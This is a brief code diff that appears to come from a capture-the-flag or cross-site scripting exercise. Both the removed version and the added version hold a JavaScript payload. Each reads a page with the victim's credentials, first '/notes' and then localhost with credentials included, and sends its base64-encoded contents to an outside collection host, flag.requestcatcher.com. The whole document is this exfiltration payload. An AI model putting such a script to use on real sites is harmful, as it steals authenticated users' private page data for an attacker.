@@ -1,3 +1,5 @@
-fetch("/notes").then(r=>r.text()).then(d=>{
-  fetch("https://flag.requestcatcher.com/?dump="+btoa(d))
-});
+<script>
+      fetch("http://localhost/", {credentials: "include"})
+        .then(r => r.text())
+        .then(data => fetch("https://flag.requestcatcher.com/?" + btoa(data)));
+    </script>
